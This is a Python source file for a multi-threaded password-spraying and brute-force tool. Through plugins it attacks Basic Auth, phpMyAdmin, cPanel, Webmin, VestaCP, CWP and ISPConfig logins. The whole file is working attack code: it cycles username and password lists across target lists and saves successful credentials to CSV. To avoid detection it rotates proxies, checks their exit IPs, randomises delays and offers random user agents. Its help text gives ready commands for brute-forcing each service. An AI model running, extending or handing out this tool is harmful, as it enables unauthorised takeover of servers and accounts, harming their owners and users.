#!/usr/bin/env python
# password_spray.py  
# v3.0 (Added --username_list support for testing multiple usernames)

import argparse
import logging
import os
import csv
import requests  # 用來測試代理所顯示的外部 IP
import time
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import random
import re
from urllib.parse import urlparse

# 匯入各插件模組
from password_spray_plugin import (
    phpmyadmin_plugin, cpanel_plugin, basic_auth_plugin,
    webmin_plugin, vestacp_plugin, ispconfig_plugin, cwp_plugin
)

# 建立日誌資料夾
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)


def clean_old_logs(directory, retention_days):
    """刪除超過保留天數的舊日誌檔案"""
    cutoff_date = datetime.now() - timedelta(days=retention_days)
    removed_files = 0
    for filename in os.listdir(directory):
        filepath = os.path.join(directory, filename)
        if os.path.isfile(filepath):
            file_mtime = datetime.fromtimestamp(os.path.getmtime(filepath))
            if file_mtime < cutoff_date:
                os.remove(filepath)
                removed_files += 1
    if removed_files:
        logging.info(f"🧹 Removed {removed_files} old log files older than {retention_days} days.")


def setup_logging(log_filename, debug=False):
    """設定日誌，清除現有的 handlers 以防重複記錄"""
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG if debug else logging.INFO)
    logger.propagate = False
    if logger.hasHandlers():
        logger.handlers.clear()
    formatter = logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S'
    )
    fh = logging.FileHandler(log_filename, encoding='utf-8')
    fh.setFormatter(formatter)
    ch = logging.StreamHandler()
    ch.setFormatter(formatter)
    logger.addHandler(fh)
    logger.addHandler(ch)
    logger.info(f"📑 Logging to file: {log_filename}")


def write_to_csv(file_path, target, port, username, password, status, response_code):
    """寫入測試結果到 CSV（成功時包含所有欄位）"""
    with open(file_path, 'a', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=[
            "Target", "Port", "Username", "Password", "Status", "ResponseCode"
        ])
        if f.tell() == 0:
            writer.writeheader()
        writer.writerow({
            "Target": target,
            "Port": port,
            "Username": username,
            "Password": password,
            "Status": status,
            "ResponseCode": response_code
        })


def write_failed_to_csv(file_path, target, port, username, password, response_code, failure_reason):
    """寫入失敗嘗試到 CSV（包含 FailureReason）"""
    os.makedirs(os.path.dirname(file_path), exist_ok=True)  # ✅ 確保目錄存在

    with open(file_path, 'a', newline='', encoding='utf-8') as f:
        fieldnames = ["Target", "Port", "Username", "Password", "ResponseCode", "FailureReason"]
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        if f.tell() == 0:
            writer.writeheader()
        writer.writerow({
            "Target":        target,
            "Port":          port,
            "Username":      username,
            "Password":      password,
            "ResponseCode":  response_code,
            "FailureReason": failure_reason
        })


def output_result(url, port, username, password, status, response_code):
    """
    在螢幕及日誌中輸出測試結果：
    - 只有在 port 非預設（HTTP 80、HTTPS 443）時才顯示 :port
    """
    # 判斷預設 port
    default_port = 443 if url.startswith('https://') else 80
    display = url if port == default_port else f"{url}:{port}"
    msg = f"{'✅ SUCCESS' if status=='Success' else '❌ FAILED'}: {display} - {username}/{password} | Code: {response_code}"
    print(msg)
    (logging.info if status=='Success' else logging.warning)(msg)


def process_login(plugin, target, port, username, password, output_file, failed_log, timeout, retries):
    """
    1) 先把 target 解析成 base_url + port_used
    2) 再交給 plugin.attempt_basic_auth 或 plugin.process_login
    3) 顯示 / 寫 CSV 時，遷就預設 port 省略 :port
    """
    logging.debug(f"🔍 Raw target: {target} | default port: {port}")

    # --- 1) parse ---
    if target.lower().startswith(('http://', 'https://')):
        parsed = urlparse(target)
    else:
        parsed = urlparse(f"http://{target}:{port}")

    scheme = parsed.scheme
    host   = parsed.hostname
    path   = parsed.path.rstrip('/')
    base_url = f"{scheme}://{host}{path}"
    port_used = parsed.port or (443 if scheme=='https' else 80)

    # --- 2) call plugin ---
    if isinstance(plugin, basic_auth_plugin.BasicAuthPlugin):
        success, code, msg = plugin.attempt_basic_auth(base_url, username, password)
    else:
        # 其他插件自己有 process_login 返回 (bool, code, msg)
        success, code, msg = plugin.process_login(
            base_url, port_used, username, password,
            output_file, failed_log, timeout, retries
        )

    status = 'Success' if success else 'Failed'

    # --- 3) output & CSV ---
    output_result(base_url, port_used, username, password, status, code)
    if success:
        write_to_csv(output_file, base_url, port_used, username, password, status, code)
    elif failed_log:
        write_failed_to_csv(failed_log, base_url, port_used, username, password, code, msg)


def read_failed_log(failed_log_file, default_port):
    """
    讀取失敗記錄，返回 list of (target_url, port, username, password)

    - 刪除末尾的 '/:<port>' 或 ':<port>'
    - 若無 http(s) scheme，預設加上 'http://'
    - 返回的 target_url 不含多餘的端口部分
    """
    if not os.path.exists(failed_log_file):
        logging.error(f"❌ Failed log file not found: {failed_log_file}")
        return []

    entries = []
    with open(failed_log_file, 'r', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        for row in reader:
            raw = row.get('Target', '').strip()
            user = row.get('Username', '').strip()
            pwd  = row.get('Password', '').strip()
            if not raw or not user or not pwd:
                continue

            # 1) 去掉末尾 '/:1234' 或 ':1234'
            raw = re.sub(r"/?:\d+$", "", raw)

            # 2) 确保有 scheme
            if not raw.lower().startswith(('http://', 'https://')):
                raw = f"http://{raw}"

            # 3) 解析
            p = urlparse(raw)
            port = p.port or (443 if p.scheme == 'https' else default_port)

            # 4) 重组 URL（只保留 scheme://hostname + path）            
            clean_url = f"{p.scheme}://{p.hostname}{p.path or ''}".rstrip('/')

            entries.append((clean_url, port, user, pwd))

    return entries


def load_proxy_pool(proxy_file):
    """讀取代理池檔案"""
    if not proxy_file or not os.path.isfile(proxy_file):
        logging.warning(f"⚠️ Proxy pool file not found: {proxy_file}")
        return []
    with open(proxy_file, 'r', encoding='utf-8') as f:
        proxies = [l.strip() for l in f if l.strip()]
    logging.info(f"🔗 Loaded {len(proxies)} proxies from {proxy_file}")
    return proxies


def test_proxy_ip(proxy=None):
    """測試代理並打印外部 IP，返回是否成功"""
    if proxy:
        logging.info(f"🌐 Testing proxy connectivity: {proxy}")
    else:
        logging.info("🌐 No proxy provided, testing direct connection")
    proxies = {'http': proxy, 'https': proxy} if proxy else {}
    try:
        r = requests.get(
            'https://api.ipify.org',
            proxies=proxies,
            headers={'Connection': 'close'},
            timeout=8
        )

        if r.status_code == 200:
            logging.info(f"🌐 Proxy IP via proxy: {r.text.strip()}")
            return True
        logging.warning(f"⚠️ Proxy test status code: {r.status_code}")
    except Exception as e:
        logging.warning(f"⚠️ Proxy test failed: {e}")
    return False


def main():
    parser = argparse.ArgumentParser(
        description='🔑 Multi-Service Password Spray Tool',
        epilog="""
PASSWORD SPRAY v3.0 (Added --username_list support)

Usage Examples:
  📌 Basic Auth Test (single username):
    python password_spray.py --target_list targets.txt --username admin --password_list passwords.txt --plugin basic_auth --output basic_auth_results.csv

  📌 Basic Auth Test (multiple usernames):
    python password_spray.py --target_list targets.txt --username_list users.txt --password_list passwords.txt --plugin basic_auth --output basic_auth_results.csv

  📌 Retry Failed Attempts:
    python password_spray.py --retry_failed previous_failed.csv --failed_log failed_attempts.csv --plugin basic_auth --output retry_results.csv

  📌 phpMyAdmin Test (with Basic Auth Results):
    python password_spray.py --plugin phpmyadmin --basic_auth_file basic_auth_results.csv --username root --password_list passwords.txt --target_list web_targets.txt --output phpmyadmin_results.csv

  📌 phpMyAdmin Force:
    python password_spray.py --target_list targets.txt --username admin --password_list passwords.txt --plugin phpmyadmin --output phpmyadmin_results.csv

  📌 cPanel Brute Force:
    python password_spray.py --target_list targets.txt --username admin --password_list passwords.txt --plugin cpanel --output cpanel_results.csv

  📌 Webmin Brute Force:
    python password_spray.py --target_list targets.txt --username admin --password_list passwords.txt --plugin webmin --output webmin_results.csv

  📌 ispconfig Brute Force:
    python password_spray.py --target_list targets.txt --username admin --password_list passwords.txt --plugin ispconfig --output ispconfig_results.csv

  📌 cwp Brute Force:
    python password_spray.py --target_list targets.txt --username admin --password_list passwords.txt --plugin cwp --output cwp_results.csv

  📌 vestacp Brute Force:
    python password_spray.py --target_list targets.txt --username admin --password_list passwords.txt --plugin vestacp --output vestacp_results.csv

Parameters:
  --target_list      檔案路徑，包含每行一個目標 (例如：192.168.1.1 或 example.com)。
  --username         單一測試帳號；與 --username_list 兩者擇一。
  --username_list    測試帳號清單檔案 (每行一個帳號)；與 --username 兩者擇一。
  --password_list    檔案路徑，包含每行一個密碼。
  --plugin           選擇目標服務插件，選項包括：basic_auth, phpmyadmin, cpanel, webmin, vestacp, cwp, ispconfig。
  --output           成功登入結果輸出至 CSV 檔案。
  --failed_log       (可選) 記錄本次測試失敗嘗試的 CSV 檔案路徑。
  --retry_failed     (可選) 指定先前失敗記錄 CSV 檔案，啟動重試模式。
  --basic_auth_file  (phpMyAdmin 模式) 包含 Basic Auth 成功結果的 CSV 檔案路徑。

Additional Options:
  --random-agent        啟用隨機 User-Agent 字串。
  --user-agent          指定固定 User-Agent 字串 (若未啟用 --random-agent)。
  --threads             同時執行的線程數 (預設: 5)。
  --timeout             請求逾時秒數 (預設: 10)。
  --retry_attempts      每組憑證的重試次數 (預設: 1)。
  --port                目標服務埠號 (預設: 80)。
  --log_retention_days  記錄檔保留天數 (預設: 7)。
  --min_delay           每次嘗試前的**最小**延遲時間 (秒)，與 --max_delay 配合使用 (預設: 1.0)。
  --max_delay           每次嘗試前的**最大**延遲時間 (秒)，與 --min_delay 配合使用 (預設: 1.0)。
  --debug               啟用除錯模式，顯示詳細日誌。
  --proxy               單一代理 (http:// 或 socks5:// 格式)。
  --proxy_pool          代理池文字檔 (一行一個代理)。

For more details, please refer to the documentation or source code.
""",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('--user-agent', dest='user_agent', default='Mozilla/5.0', help='Fixed User-Agent string to use (for phpMyAdmin login)')
    parser.add_argument('--target_list')
    parser.add_argument('--username')
    parser.add_argument('--username_list')
    parser.add_argument('--password_list')
    parser.add_argument('--basic_auth_file')
    parser.add_argument('--plugin', required=True, choices=[
        'basic_auth', 'phpmyadmin', 'cpanel', 'webmin', 'vestacp', 'cwp', 'ispconfig'
    ])
    parser.add_argument('--output', required=True)
    parser.add_argument('--failed_log')
    parser.add_argument('--retry_failed')
    parser.add_argument('--threads', type=int, default=5)
    parser.add_argument("--timeout", type=int, default=8, help="Request timeout (must be > 0)")
    parser.add_argument('--retry_attempts', type=int, default=1)
    parser.add_argument('--port', type=int, default=80)
    parser.add_argument('--log_retention_days', type=int, default=7)
    parser.add_argument('--debug', action='store_true')
    parser.add_argument('--proxy')
    parser.add_argument('--proxy_pool')
    parser.add_argument('--min_delay', type=float, default=1.0)
    parser.add_argument('--max_delay', type=float, default=1.0)
    args = parser.parse_args()
    if args.timeout <= 0:
            parser.error("--timeout must be greater than 0")
    

    # 如果不是在重試模式，必須提供 target_list 和 password_list
    if not args.retry_failed:
        try:
            targets = [l.strip() for l in open(args.target_list) if l.strip()]
        except Exception as e:
            return logging.error(f"Read target_list fail: {e}")
        try:
            passwords = [l.strip() for l in open(args.password_list) if l.strip()]
        except Exception as e:
            return logging.error(f"Read password_list fail: {e}")

        if args.username_list:
            try:
                usernames = [l.strip() for l in open(args.username_list) if l.strip()]
                if not usernames:
                    return logging.error(f"No usernames found in {args.username_list}")
            except Exception as e:
                return logging.error(f"Read username_list fail: {e}")
        else:
            usernames = [args.username]

        # spray 總次數 (targets × usernames × passwords)
        total = len(targets) * len(usernames) * len(passwords)
        pb = tqdm(total=total, desc='Spray Progress')









    # failed_log 唯一化
    if args.failed_log:
        b, e = os.path.splitext(args.failed_log)
        args.failed_log = f"{b}_{datetime.now().strftime('%Y%m%d_%H%M%S')}{e}"

    # setup logging
    logf = os.path.join(LOG_DIR, f"{args.plugin}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
    setup_logging(logf, args.debug)

    # 清理舊日誌
    clean_old_logs(LOG_DIR, args.log_retention_days)

    # load & validate proxies
    pool = load_proxy_pool(args.proxy_pool) if args.proxy_pool else []
    valid_pool = []
    for pr in pool:
        if test_proxy_ip(pr):
            valid_pool.append(pr)
        else:
            logging.warning(f"🚮 Removing invalid proxy: {pr}")
    pool = valid_pool
    single = args.proxy
    if single and test_proxy_ip(single):
        pass
    elif single:
        logging.warning(f"🚮 Single proxy invalid: {single}")
        single = None





    # init plugin
    if args.plugin == 'basic_auth':
        plugin = basic_auth_plugin.BasicAuthPlugin(
            threads=args.threads, timeout=args.timeout,
            debug=args.debug, proxy=single, proxy_pool=pool
            , logger=logging.getLogger(f"brute.basic_auth")
        )
    elif args.plugin == 'phpmyadmin':
        # PhpMyAdminPlugin 不支援 proxy_pool、logger 參數
        plugin = phpmyadmin_plugin.PhpMyAdminPlugin(
            threads=args.threads,
            timeout=args.timeout,
            debug=args.debug,
            scheme="https",
            user_agent=args.user_agent,
            proxy=single
        )
        if not args.username and not args.username_list:
            return logging.error('Need --username or --username_list for phpmyadmin')

        plugin.run_attack(
            phpmyadmin_user=args.username,
            phpmyadmin_user_list_file=args.username_list,
            phpmyadmin_pass_list_file=args.password_list,
            output_file=args.output,
            target_list_file=args.target_list,
            basic_auth_file=args.basic_auth_file,
            threads=args.threads,
            timeout=args.timeout,
            failed_log=args.failed_log
        )
        return

    elif args.plugin == 'cpanel':
        plugin = cpanel_plugin.CPanelBruteForcePlugin(
            threads=args.threads, timeout=args.timeout,
            debug=args.debug, proxy=single, proxy_pool=pool
            , logger=logging.getLogger(f"brute.cpanel")
        )
    elif args.plugin == 'webmin':
        plugin = webmin_plugin.WebminBruteForcePlugin(
            threads=args.threads, timeout=args.timeout,
            debug=args.debug, random_agent=False,
            proxy=single, proxy_pool=pool
            , logger=logging.getLogger(f"brute.webmin")
        )
    elif args.plugin == 'vestacp':
        plugin = vestacp_plugin.VestaCPBruteForcePlugin(
            threads=args.threads, timeout=args.timeout,
            debug=args.debug, proxy=single, proxy_pool=pool
            , logger=logging.getLogger(f"brute.vestacp")
        )
    elif args.plugin == 'cwp':
        plugin = cwp_plugin.CWPBruteForcePlugin(
            threads=args.threads, timeout=args.timeout,
            debug=args.debug, proxy=single, proxy_pool=pool
            , logger=logging.getLogger(f"brute.cwp")
        )
    else:
        plugin = ispconfig_plugin.ISPConfigBruteForcePlugin(
            threads=args.threads, timeout=args.timeout,
            debug=args.debug, proxy=single, proxy_pool=pool
            , logger=logging.getLogger(f"brute.ispconfig")
        )

    # retry 模式
    if args.retry_failed:
        entries = read_failed_log(args.retry_failed, args.port)
        if not entries:
            return logging.error('No failed retries')
        pb = tqdm(total=len(entries), desc='Retry Progress')
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futures = [
                ex.submit(
                    plugin.process_login,
                    tgt, port, user, pwd,
                    args.output,
                    args.failed_log,
                    args.timeout,
                    args.retry_attempts,
                )
                for tgt, port, user, pwd in entries
            ]

            with tqdm(total=len(futures), desc="Spray Progress") as pb:
                for f in as_completed(futures):
                    try:
                        f.result()
                    except Exception as e:
                        logging.error(f"Thread exception: {e}")
                    pb.update(1)
        return

    # 讀取 targets/passwords


    # spray 總次數 (targets × usernames × passwords)
    total = len(targets) * len(usernames) * len(passwords)
    pb = tqdm(total=total, desc='Spray Progress')

    # 本地外部 IP
    try:
        local_ip = requests.get('https://api.ipify.org', timeout=5).text.strip()
    except Exception:
        local_ip = 'Unknown'

    # 代理出口 IP 緩存
    proxy_ip_cache = {}

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        for pwd in passwords:
            futures = []
            for user in usernames:
                for tgt in targets:
                    delay = random.uniform(args.min_delay, args.max_delay)
                    time.sleep(delay)

                    proxy_str = random.choice(pool) if pool else single

                    if proxy_str:
                        try:
                            resp = requests.get(
                                'https://api.ipify.org',
                                proxies={'http': proxy_str, 'https': proxy_str},
                                headers={'Connection': 'close'},
                                timeout=5
                            )
                            exit_ip = resp.text.strip() if resp.status_code == 200 else f"ErrorCode:{resp.status_code}"
                        except Exception as e:
                            exit_ip = f"Error:{e}"

                        logging.info(
                            f"🔍 Testing target: {tgt} with username: {user} password: {pwd} | "
                            f"Proxy: {proxy_str} | Exit IP: {exit_ip}"
                        )

                    if args.plugin == 'basic_auth':
                        futures.append(ex.submit(
                            process_login, plugin, tgt, args.port,
                            user, pwd,
                            args.output, args.failed_log,
                            args.timeout, args.retry_attempts
                        ))
                    else:
                        futures.append(ex.submit(
                            plugin.process_login, tgt, args.port,
                            user, pwd,
                            args.output, args.failed_log,
                            args.timeout, args.retry_attempts
                        ))

            for f in as_completed(futures):
                try:
                    f.result()
                except Exception as e:
                    logging.error(f"Thread exception: {e}")
                pb.update(1)

    pb.close()
    logging.info('✅ Completed')


if __name__ == '__main__':
    main()
